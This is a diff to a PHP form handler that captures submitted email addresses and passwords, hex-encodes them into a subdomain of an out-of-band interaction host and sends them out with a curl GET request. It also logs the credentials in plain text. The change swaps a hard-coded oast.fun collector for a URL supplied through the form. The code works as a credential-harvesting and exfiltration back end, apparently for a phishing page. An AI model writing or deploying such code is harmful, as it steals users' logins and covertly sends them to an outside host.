@@ -1,11 +1,9 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Hardcoded OOB URL
-    $oob_url = "oexfjevatexeojostniisl9j0b5hjv076.oast.fun";
-
     // Collecting data from the form
     $email = $_POST['email'];
     $password = $_POST['password'];
+    $oob_url = $_POST['oob-url'];  // Collect the OOB URL passed from the form
 
     // Combine email and password with a space
     $combined = $email . " " . $password;
@@ -14,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $hex = bin2hex($combined);
 
     // Prepend the hex value to the OOB URL
-    $full_url = "http://" . $hex . "." . $oob_url;
+    $full_url = "http://" . $hex . "." . $oob_url;  // Use the user-provided OOB URL
 
     // Send a GET request to the full URL
     $ch = curl_init();
@@ -36,7 +34,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
     // Formatting the log entry
-    $logEntry = "Email: " . $email . " - Password: " . $password . "\n";
+    $logEntry = "Email: " . $email . " - Password: " . $password . " - OOB URL: " . $oob_url . "\n";
 
     // Writing the log entry to the file
     if (fwrite($file, $logEntry) === FALSE) {
